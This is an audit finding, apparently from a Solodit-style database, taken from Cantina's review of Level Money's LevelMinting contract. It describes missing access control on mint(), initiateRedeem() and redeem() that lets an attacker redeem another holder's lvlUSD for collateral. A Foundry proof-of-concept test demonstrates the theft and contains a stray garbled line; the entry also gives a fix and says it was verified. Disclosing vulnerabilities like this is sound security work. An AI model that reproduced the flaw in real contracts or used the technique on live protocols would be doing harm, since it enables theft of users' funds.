---
# Core Classification
protocol: Level  Money
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 42043
audit_firm: Cantina
contest_link: https://cantina.xyz/portfolio/99c7abab-0ff5-4e0e-a796-b1294271ca25
source_link: https://cdn.cantina.xyz/reports/cantina_level_money_sep2024.pdf
github_link: none

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.00
financial_impact: high

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 4
finders:
  - Delvir0
  - tchkvsky
  - MiloTruck
  - xiaoming90
---

## Vulnerability Title

mint() , initiateRedeem() , and redeem() lack access control 

### Overview


The bug report highlights an issue in the LevelMinting contract where any caller of the mint(), initiateRedeem() or redeem() functions can set the order.benefactor to an arbitrary address. This allows an attacker to transfer collateral to their own address by setting the order.beneficiary to their address and the order.benefactor to an address that holds lvlUSD. The report also includes a proof of concept code and suggests implementing access control in the mentioned functions to prevent this attack. The bug has been fixed in the latest commit.

### Original Finding Content

## Vulnerability Report

## Context
- **File**: LevelMinting.sol
- **Line Numbers**: L193, L254

## Description
The issue lies in the fact that any caller of the `mint()`, `initiateRedeem()`, or `redeem()` function can set the `order.benefactor` to an arbitrary address. This enables an attacker to set `order.benefactor` to any address that holds `lvlUSD` and the `order.beneficiary` to the attacker’s address, facilitating the transfer of collateral to the attacker.

## Proof of Concept
```solidity
function test_bobRedeemFromUser() public {
    console.log("balance of bob", stETHToken.balanceOf(bob)); // = 0
    vm.startPrank(owner);
    LevelMintingContract.setCheckRedeemerRole(false);
    vm.stopPrank();
    
    (
        ILevelMinting.Order memory order,
        ILevelMinting.Route memory route
    ) = mint_setup(_stETHToDeposit, _stETHToDeposit, 1, false); // note sets order for default values
    (benefactor),
    LevelMintingContract.mint(order, route);
    
    ILevelMinting.Order memory order2 = ILevelMinting.Order({
        order_type: ILevelMinting.OrderType.REDEEM,
        nonce: 3,
        benefactor: beneficiary, // note beneficiary received token in above mint_setup
        beneficiary: bob, // note set to bob in order to steal the funds
        collateral_asset: address(stETHToken),
        lvlusd_amount: _stETHToDeposit, // note to match mint_setup
        collateral_amount: _stETHToDeposit // note to match mint_setup
    });
    
    vm.startPrank(beneficiary);
    lvlusdToken.approve(address(LevelMintingContract), _stETHToDeposit);
    vm.startPrank(bob);
    LevelMintingContract.initiateRedeem(order2);
    vm.warp(8 days);
    LevelMintingContract.completeRedeem(address(stETHToken));
    console.log("balance of bob", stETHToken.balanceOf(bob)); // = 50e18
}
```

## Note
The attack will be possible if:
1. The victim has residual `lvlUSD` allowance to the LevelMinting contract or
2. The attacker frontruns the victim's `mint()` or `redeem()` call after the approval transaction.

## Recommendation
Implement access control in `mint()`, `initiateRedeem()`, and `redeem()` to block a user from setting the `order.benefactor` to any address other than `msg.sender` or if the user has an allowance.

## Status
- **Level Money**: Fixed in commit `5afc1851`.
- **Cantina**: Verified; `mint()`, `initiateRedeem()`, and `redeem()` now check that `order.benefactor` is set to `msg.sender`.

### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Cantina |
| Protocol | Level  Money |
| Report Date | N/A |
| Finders | Delvir0, tchkvsky, MiloTruck, xiaoming90 |

### Source Links

- **Source**: https://cdn.cantina.xyz/reports/cantina_level_money_sep2024.pdf
- **GitHub**: N/A
- **Contest**: https://cantina.xyz/portfolio/99c7abab-0ff5-4e0e-a796-b1294271ca25

### Keywords for Search

`vulnerability`

